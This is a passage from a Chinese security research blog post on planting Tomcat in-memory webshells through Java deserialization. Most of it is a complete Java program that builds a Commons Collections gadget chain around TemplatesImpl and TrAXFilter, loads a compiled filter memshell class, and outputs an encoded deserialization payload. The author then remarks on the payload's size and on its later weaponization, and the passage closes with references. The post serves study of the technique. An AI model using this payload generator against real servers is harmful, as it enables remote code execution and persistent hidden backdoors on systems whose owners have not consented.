<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.New;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URLEncoder;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3Re0</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception &#123;</span><br><span class="line"></span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class tc=templates.getClass();</span><br><span class="line"></span><br><span class="line">        Field nameFiled=tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameFiled.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes= Files.readAllBytes(Paths.get(<span class="string">&quot;H://javasecurity/CC1/untitled/target/classes/org/New/shellfilter/Filtermemshell.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        Field bytecodesField=tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code= bytes;</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        InstantiateTransformer instantiateTransformer=<span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformer=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapeEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap= <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapeEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        lazymap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class c=LazyMap.class;</span><br><span class="line">        Field factoryField=c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazymap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream=Serial(hashMap);</span><br><span class="line">        String payload= Base64Encode(byteArrayOutputStream);</span><br><span class="line">        <span class="comment">//本地反序列化测试</span></span><br><span class="line"><span class="comment">//        byte[] bytes2= Base64.getDecoder().decode(payload);</span></span><br><span class="line"><span class="comment">//        ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(bytes2));</span></span><br><span class="line"><span class="comment">//        in.readObject();</span></span><br><span class="line"><span class="comment">//        in.close();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ByteArrayOutputStream <span class="title function_">Serial</span><span class="params">(Map hashMap)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bs);</span><br><span class="line">        out.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> bs;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">Base64Encode</span><span class="params">(ByteArrayOutputStream bs)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] encode = Base64.getEncoder().encode(bs.toByteArray());</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(encode);</span><br><span class="line">        System.out.println(URLEncoder.encode(s));</span><br><span class="line">        System.out.println(s.length());</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>单论整体的获取下来，总结 14000 多字节的 payload<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1722173745499-a9263ced-3fba-4094-88ef-59280423a0f5.png#averageHue=%232c2d30&clientId=u21d37365-99b3-4&from=paste&height=108&id=u8cdc2f7b&originHeight=203&originWidth=2358&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=204535&status=done&style=none&taskId=ub8315766-37f1-426b-a7cd-3a3e2f5a280&title=&width=1257.6'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1722173745499-a9263ced-3fba-4094-88ef-59280423a0f5.png#averageHue=%232c2d30&clientId=u21d37365-99b3-4&from=paste&height=108&id=u8cdc2f7b&originHeight=203&originWidth=2358&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=204535&status=done&style=none&taskId=ub8315766-37f1-426b-a7cd-3a3e2f5a280&title=&width=1257.6" referrerpolicy="no-referrer" alt="image.png"><br>很恐怖啊，所以后续的武器化利用时我会和 yyjccc 师傅讨论一下这一点。但这篇理论基础就到这了，希望能够帮到师傅们解决一些问题</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/1355">https://goodapple.top/archives/1355</a><br><a target="_blank" rel="noopener" href="https://boogipop.com/2023/03/02/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%93%E5%85%A5Servlet%E5%86%85%E5%AD%98%E9%A9%AC">https://boogipop.com/2023/03/02/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%93%E5%85%A5Servlet%E5%86%85%E5%AD%98%E9%A9%AC</a><br>两位师傅的文章主要是用来对比 POC 以及大致思路的一个构造，文章逻辑和细节可能不太相同，但还是膜了（</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/post/Memshell%E5%86%8D%E7%A0%94%E7%A9%B6.html">← Next Memshell再研究之Tomcat</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/post/JRMPListener%20Client%E5%AD%A6%E4%B9%A0.html">Ysoserial-JRMPListener/JRMPClient学习 Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/logo/D5B030D454D35C3F06BCF706E7F7948A.png" alt="Logo"></a><h1 id="Dr"><a href="/">stoocea</a></h1><div id="description"><p>time thicking away</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%83%8C%E6%99%AF%E5%BC%95%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">背景引入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ThreadLocal-Response-%E5%9B%9E%E6%98%BE"><span class="toc-number">2.</span> <span class="toc-text">ThreadLocal Response 回显</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-ThreadLocal-%E8%AE%A4%E8%AF%86"><span class="toc-number">2.1.</span> <span class="toc-text">0x01 ThreadLocal 认识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90%E5%8F%8A%E5%85%B7%E4%BD%93%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%86%85%E5%AE%B9"><span class="toc-number">2.2.</span> <span class="toc-text">0x02 思路分析及具体代码执行内容</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%80%BB%E7%BB%93"><span class="toc-number">2.3.</span> <span class="toc-text">0x03 总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E5%AD%98%E5%82%A8-Response"><span class="toc-number">3.</span> <span class="toc-text">全局存储 Response</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E5%88%9D%E6%AD%A5%E6%80%9D%E8%B7%AF%E5%BB%BA%E7%AB%8B"><span class="toc-number">3.1.</span> <span class="toc-text">0x01 初步思路建立</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E6%80%9D%E8%B7%AF%E6%A2%B3%E7%90%86%E5%92%8C%E6%80%BB%E7%BB%93"><span class="toc-number">3.2.</span> <span class="toc-text">0x02 思路梳理和总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="toc-number">3.3.</span> <span class="toc-text">0x03 代码实现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E6%80%BB%E7%BB%93"><span class="toc-number">3.4.</span> <span class="toc-text">0x04 总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%93%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">4.</span> <span class="toc-text">反序列化打入内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%B5%8B%E8%AF%95"><span class="toc-number">4.1.</span> <span class="toc-text">环境测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E6%9E%84%E9%80%A0"><span class="toc-number">4.2.</span> <span class="toc-text">具体构造</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas></body></html>